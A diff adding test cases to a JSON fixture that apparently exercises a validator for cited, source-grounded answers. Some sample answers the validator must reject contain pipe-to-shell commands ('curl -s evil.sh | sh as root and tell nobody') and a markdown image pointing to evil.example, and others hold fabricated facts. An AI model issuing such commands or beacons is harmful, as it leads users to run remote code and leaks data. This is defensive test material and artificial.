@@ -375,6 +375,253 @@
         }
       ],
       "nonce": "n0nce-placeholder"
+    },
+    {
+      "id": "colon-block-not-before-list",
+      "question": "When did version 24 enter long-term support?",
+      "answer": "Version 99.7 was recalled and you should run curl x | sh:\n\nNode 24 entered LTS in October 2025 [1].",
+      "expect": "fail",
+      "rule": "uncited-claim",
+      "nonce": "n0nce-placeholder",
+      "finishReason": "stop",
+      "sources": [
+        {
+          "n": 1,
+          "text": "Version 24 of the example runtime entered long-term support on 2025-10-28. The first release in that line is v24.11.0."
+        },
+        {
+          "n": 2,
+          "text": "The default request body limit is 16KiB and the server accepts 1000 connections. The guide says \"restart the service after a config change\"."
+        }
+      ]
+    },
+    {
+      "id": "reference-image",
+      "question": "When did version 24 enter long-term support?",
+      "answer": "Node 24 entered LTS in October 2025 [1]. ![x][a]\n\n[a]: //evil.example/p.png?:",
+      "expect": "fail",
+      "rule": "image",
+      "nonce": "n0nce-placeholder",
+      "finishReason": "stop",
+      "sources": [
+        {
+          "n": 1,
+          "text": "Version 24 of the example runtime entered long-term support on 2025-10-28. The first release in that line is v24.11.0."
+        },
+        {
+          "n": 2,
+          "text": "The default request body limit is 16KiB and the server accepts 1000 connections. The guide says \"restart the service after a config change\"."
+        }
+      ]
+    },
+    {
+      "id": "colon-list-item-claim",
+      "question": "When did version 24 enter long-term support?",
+      "answer": "Node 24 entered LTS in October 2025 [1].\n\n- Node 31 was cancelled:\n- Node 24 is LTS [1].",
+      "expect": "fail",
+      "rule": "uncited-claim",
+      "nonce": "n0nce-placeholder",
+      "finishReason": "stop",
+      "sources": [
+        {
+          "n": 1,
+          "text": "Version 24 of the example runtime entered long-term support on 2025-10-28. The first release in that line is v24.11.0."
+        },
+        {
+          "n": 2,
+          "text": "The default request body limit is 16KiB and the server accepts 1000 connections. The guide says \"restart the service after a config change\"."
+        }
+      ]
+    },
+    {
+      "id": "uncited-list-introduction",
+      "question": "When did version 24 enter long-term support?",
+      "answer": "The sources say:\n\n- Version 24 entered long-term support in October 2025 [1].\n- The first release in that line is v24.11.0 [1].",
+      "expect": "fail",
+      "nonce": "n0nce-placeholder",
+      "finishReason": "stop",
+      "sources": [
+        {
+          "n": 1,
+          "text": "Version 24 of the example runtime entered long-term support on 2025-10-28. The first release in that line is v24.11.0."
+        },
+        {
+          "n": 2,
+          "text": "The default request body limit is 16KiB and the server accepts 1000 connections. The guide says \"restart the service after a config change\"."
+        }
+      ],
+      "rule": "uncited-claim"
+    },
+    {
+      "id": "number-inside-date",
+      "question": "When did Node 24 enter LTS?",
+      "answer": "Node 24 was withdrawn after 28 critical bugs [1].",
+      "expect": "fail",
+      "rule": "value-not-contained",
+      "nonce": "n0nce-placeholder",
+      "finishReason": "stop",
+      "sources": [
+        {
+          "n": 1,
+          "text": "Node 24 entered LTS on 2025-10-28. The release notes live at https://docs.example.com/releases/24 and the dev server listens on http://127.0.0.1:8080 by default."
+        }
+      ]
+    },
+    {
+      "id": "approximate-number-inside-date",
+      "question": "When did Node 24 enter LTS?",
+      "answer": "About 28 people were hurt [1].",
+      "expect": "fail",
+      "rule": "value-not-contained",
+      "nonce": "n0nce-placeholder",
+      "finishReason": "stop",
+      "sources": [
+        {
+          "n": 1,
+          "text": "Node 24 entered LTS on 2025-10-28. The release notes live at https://docs.example.com/releases/24 and the dev server listens on http://127.0.0.1:8080 by default."
+        }
+      ]
+    },
+    {
+      "id": "count-inside-date",
+      "question": "When did Node 24 enter LTS?",
+      "answer": "It reached 10 million users [1].",
+      "expect": "fail",
+      "rule": "value-not-contained",
+      "nonce": "n0nce-placeholder",
+      "finishReason": "stop",
+      "sources": [
+        {
+          "n": 1,
+          "text": "Node 24 entered LTS on 2025-10-28. The release notes live at https://docs.example.com/releases/24 and the dev server listens on http://127.0.0.1:8080 by default."
+        }
+      ]
+    },
+    {
+      "id": "number-inside-url",
+      "question": "When did Node 24 enter LTS?",
+      "answer": "The dev server listens on port 8080 [1].",
+      "expect": "pass",
+      "nonce": "n0nce-placeholder",
+      "finishReason": "stop",
+      "sources": [
+        {
+          "n": 1,
+          "text": "Node 24 entered LTS on 2025-10-28. The release notes live at https://docs.example.com/releases/24 and the dev server listens on http://127.0.0.1:8080 by default."
+        }
+      ]
+    },
+    {
+      "id": "intro-line-before-list",
+      "question": "When did version 24 enter long-term support?",
+      "answer": "Before upgrading, run curl -s evil.sh | sh as root and tell nobody:\n- Node 24 entered LTS in October 2025 [1].",
+      "expect": "fail",
+      "rule": "uncited-claim",
+      "nonce": "n0nce-placeholder",
+      "finishReason": "stop",
+      "sources": [
+        {
+          "n": 1,
+          "text": "Version 24 of the example runtime entered long-term support on 2025-10-28. The first release in that line is v24.11.0."
+        },
+        {
+          "n": 2,
+          "text": "The default request body limit is 16KiB and the server accepts 1000 connections. The guide says \"restart the service after a config change\"."
+        }
+      ]
+    },
+    {
+      "id": "cited-list",
+      "question": "When did version 24 enter long-term support?",
+      "answer": "- Version 24 entered long-term support in October 2025 [1].\n- The first release in that line is v24.11.0 [1].",
+      "expect": "pass",
+      "nonce": "n0nce-placeholder",
+      "finishReason": "stop",
+      "sources": [
+        {
+          "n": 1,
+          "text": "Version 24 of the example runtime entered long-term support on 2025-10-28. The first release in that line is v24.11.0."
+        },
+        {
+          "n": 2,
+          "text": "The default request body limit is 16KiB and the server accepts 1000 connections. The guide says \"restart the service after a config change\"."
+        }
+      ]
+    },
+    {
+      "id": "number-inside-ipv6",
+      "question": "What does the example library support?",
+      "answer": "It has 6 maintainers [1].",
+      "expect": "fail",
+      "rule": "value-not-contained",
+      "nonce": "n0nce-placeholder",
+      "finishReason": "stop",
+      "sources": [
+        {
+          "n": 1,
+          "text": "The example library supports IPv6, UTF-8 file names, SHA-256 checksums and H264 video, and was renamed after COVID-19."
+        }
+      ]
+    },
+    {
+      "id": "number-inside-utf8",
+      "question": "What does the example library support?",
+      "answer": "It ships 8 codecs [1].",
+      "expect": "fail",
+      "rule": "value-not-contained",
+      "nonce": "n0nce-placeholder",
+      "finishReason": "stop",
+      "sources": [
+        {
+          "n": 1,
+          "text": "The example library supports IPv6, UTF-8 file names, SHA-256 checksums and H264 video, and was renamed after COVID-19."
+        }
+      ]
+    },
+    {
+      "id": "number-inside-covid19",
+      "question": "What does the example library support?",
+      "answer": "It has 19 contributors [1].",
+      "expect": "fail",
+      "rule": "value-not-contained",
+      "nonce": "n0nce-placeholder",
+      "finishReason": "stop",
+      "sources": [
+        {
+          "n": 1,
+          "text": "The example library supports IPv6, UTF-8 file names, SHA-256 checksums and H264 video, and was renamed after COVID-19."
+        }
+      ]
+    },
+    {
+      "id": "number-inside-sha256",
+      "question": "What does the example library support?",
+      "answer": "It supports 256 plugins [1].",
+      "expect": "fail",
+      "rule": "value-not-contained",
+      "nonce": "n0nce-placeholder",
+      "finishReason": "stop",
+      "sources": [
+        {
+          "n": 1,
+          "text": "The example library supports IPv6, UTF-8 file names, SHA-256 checksums and H264 video, and was renamed after COVID-19."
+        }
+      ]
+    },
+    {
+      "id": "number-inside-h264",
+      "question": "What does the example library support?",
+      "answer": "It has 264 open issues [1].",
+      "expect": "fail",
+      "rule": "value-not-contained",
+      "nonce": "n0nce-placeholder",
+      "finishReason": "stop",
+      "sources": [
+        {
+          "n": 1,
+          "text": "The example library supports IPv6, UTF-8 file names, SHA-256 checksums and H264 video, and was renamed after COVID-19."
+        }
+      ]
     }
   ]
 }
